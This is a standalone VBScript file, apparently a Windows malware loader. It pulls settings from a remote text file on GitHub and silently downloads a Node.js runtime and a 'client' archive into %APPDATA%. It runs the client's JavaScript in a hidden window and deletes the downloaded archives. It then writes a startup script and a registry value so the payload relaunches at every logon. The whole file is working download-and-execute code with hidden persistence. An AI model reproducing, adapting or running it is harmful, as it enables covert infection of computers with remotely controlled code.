Option Explicit

Dim objShell, objFSO, objHTTP
Dim appData, nodeDir, nodeZip, clientZip, nodeExe, clientJs
Dim nodeZipUrl, clientZipUrl, regPath
Dim configUrl, dict, rawText, lines, line, key, value
Dim i, success, vbsFile, f

Set objShell = CreateObject("Wscript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")
Set objHTTP  = CreateObject("MSXML2.XMLHTTP")

configUrl = "https://raw.githubusercontent.com/DaleGelb/files/main/ConfAl.txt"
objHTTP.Open "GET", configUrl, False
objHTTP.Send
If objHTTP.Status <> 200 Then WScript.Quit

rawText = objHTTP.ResponseText
rawText = Replace(rawText, vbCrLf, vbLf)
rawText = Replace(rawText, vbCr, vbLf)

Set dict = CreateObject("Scripting.Dictionary")
lines = Split(rawText, vbLf)
For Each line In lines
    If Trim(line) <> "" And InStr(line, "=") > 0 Then
        key   = Trim(Split(line, "=")(0))
        value = Trim(Split(line, "=")(1))
        dict(key) = value
    End If
Next

If Not dict.Exists("NODE_ZIP_URL") Then WScript.Quit
If Not dict.Exists("CLIENT_ZIP_URL") Then WScript.Quit
If Not dict.Exists("CLIENT_JS") Then WScript.Quit
If Not dict.Exists("REG_PATH") Then WScript.Quit

nodeZipUrl   = dict("NODE_ZIP_URL")
clientZipUrl = dict("CLIENT_ZIP_URL")
clientJs     = dict("CLIENT_JS")
regPath      = dict("REG_PATH")

appData = objShell.ExpandEnvironmentStrings("%APPDATA%")
nodeZip = appData & "\node.zip"
clientZip = appData & "\client.zip"
nodeDir = appData & "\node-v22.19.0-win-x64"
nodeExe = nodeDir & "\node.exe"

If Not objFSO.FolderExists(appData) Then objFSO.CreateFolder appData

success = False
For i = 1 To 3
    objShell.Run "cmd /c curl -L -o """ & nodeZip & """ " & nodeZipUrl, 0, True
    If objFSO.FileExists(nodeZip) Then
        objShell.Run "cmd /c tar -xf """ & nodeZip & """ -C """ & appData & """", 0, True
        If objFSO.FileExists(nodeExe) Then
            success = True
            On Error Resume Next: objFSO.DeleteFile nodeZip, True: On Error GoTo 0
            Exit For
        End If
    End If
    WScript.Sleep 2000
Next
If Not success Then WScript.Quit

objShell.Run "cmd /c curl -L -o """ & clientZip & """ " & clientZipUrl, 0, True
If objFSO.FileExists(clientZip) Then
    objShell.Run "cmd /c tar -xf """ & clientZip & """ -C """ & nodeDir & """", 0, True
    On Error Resume Next: objFSO.DeleteFile clientZip, True: On Error GoTo 0
End If

If objFSO.FileExists(nodeExe) Then
    objShell.Run """" & nodeExe & """ """ & nodeDir & "\" & clientJs & """", 0, False
End If

vbsFile = nodeDir & "\startup.vbs"
Set f = objFSO.CreateTextFile(vbsFile, True)
f.WriteLine "Set sh = CreateObject(""Wscript.Shell"")"
f.WriteLine "q = Chr(34)"
f.WriteLine "cmd = q & """ & nodeExe & """ & q & "" "" & q & """ & nodeDir & "\" & clientJs & """ & q"
f.WriteLine "sh.Run cmd, 0, False"
f.Close

objShell.RegWrite regPath, "wscript.exe """ & vbsFile & """", "REG_SZ"
